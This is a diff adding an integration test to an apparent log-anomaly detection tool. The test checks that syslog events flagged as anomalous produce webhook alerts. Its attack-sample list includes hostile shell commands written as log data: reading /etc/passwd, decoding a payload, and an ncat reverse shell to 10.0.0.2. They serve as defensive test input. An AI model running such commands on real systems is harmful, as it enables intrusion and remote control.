@@ -7,17 +7,23 @@ aiohttp.ClientSession.post() path is exercised without external network calls.
 
 from __future__ import annotations
 
+import asyncio
 import time
 import uuid
 from typing import TYPE_CHECKING
+from unittest.mock import patch
 
+import aiohttp
 import pytest
 from aiohttp import web
 from aiohttp.test_utils import TestServer
 
-from seerflow.config import StorageConfig
+from seerflow.alerting.dispatcher import AlertDispatcher, WebhookTarget
+from seerflow.config import SeerflowConfig, StorageConfig
+from seerflow.detection.ensemble import DetectionEnsemble, DetectionResult
 from seerflow.models.alert import Alert
 from seerflow.models.event import SeverityLevel
+from seerflow.pipeline.handler import make_handler
 from seerflow.receivers.base import RawEvent
 from seerflow.storage.sqlite import SqliteBackend
 
@@ -101,3 +107,87 @@ async def storage(tmp_path: Path) -> AsyncIterator[SqliteBackend]:
         yield backend
     finally:
         await backend.close()
+
+
+# ---------------------------------------------------------------------------
+# Test messages (mirror test_e2e_pipeline for consistency)
+# ---------------------------------------------------------------------------
+
+
+_NORMAL_MESSAGES = [
+    f"<134>1 2026-03-28T{10 + i // 60:02d}:{i % 60:02d}:00Z web nginx {i} - - "
+    f"GET /api/v1/health 200 {10 + i}ms"
+    for i in range(50)
+]
+
+_ATTACK_MESSAGES = [
+    "<134>1 2026-03-28T11:00:00Z server1 bash 1001 - - bash -c whoami",
+    "<134>1 2026-03-28T11:00:01Z server1 sshd 1002 - - "
+    "Failed password for root from 10.0.0.1 port 22 ssh2",
+    "<134>1 2026-03-28T11:00:02Z server1 bash 1003 - - cat /etc/passwd",
+    "<134>1 2026-03-28T11:00:03Z server1 bash 1004 - - base64 -d /tmp/payload",
+    "<134>1 2026-03-28T11:00:04Z server1 bash 1005 - - ncat -e /bin/bash 10.0.0.2 4444",
+]
+
+
+# ---------------------------------------------------------------------------
+# Tests
+# ---------------------------------------------------------------------------
+
+
+_FORCED_ANOMALY = DetectionResult(
+    score=0.92,
+    upper_threshold=0.65,
+    lower_threshold=0.10,
+    is_anomaly=True,
+    anomaly_direction="upper",
+    source_type="syslog",
+)
+
+
+class TestWebhookPipeline:
+    """Integration tests for handler → dispatcher → HTTP POST flow."""
+
+    async def test_handler_enqueues_alert_to_dispatcher(
+        self,
+        webhook_server: tuple[str, list[dict[str, object]]],
+        storage: SqliteBackend,
+    ) -> None:
+        """Full path: events → handler → write_alert → enqueue → POST to server.
+
+        Uses a forced anomaly DetectionResult (mirrors test_alert_persistence.py)
+        to remove dependency on ML warmup/scoring drift; the goal here is to
+        verify the *wiring*, not the detector itself.
+        """
+        url, received = webhook_server
+        target = WebhookTarget(name="webhook-0", url=url, format="json", min_severity=0)
+
+        async with aiohttp.ClientSession() as session:
+            dispatcher = AlertDispatcher(targets=(target,), session=session)
+            task = asyncio.create_task(dispatcher.run())
+
+            config = SeerflowConfig()
+            ensemble = DetectionEnsemble(config.detection)
+            handler = make_handler(
+                ensemble,
+                storage,
+                save_interval_ns=999_999_999_999,
+                alert_dispatcher=dispatcher,
+            )
+
+            with patch.object(type(ensemble), "process_event", return_value=_FORCED_ANOMALY):
+                for msg in _ATTACK_MESSAGES:
+                    await handler(_raw(msg))
+
+            # Give dispatcher time to process queue
+            await asyncio.sleep(0.1)
+            await dispatcher.stop()
+            await asyncio.wait_for(task, timeout=5.0)
+
+        assert len(received) > 0, "Expected at least one webhook POST after forced anomaly events"
+        payload = received[0]
+        assert "alert_id" in payload
+        assert "severity" in payload
+        assert "rule_name" in payload
+        assert "timestamp" in payload
+        assert payload["rule_name"] == "hst-anomaly"
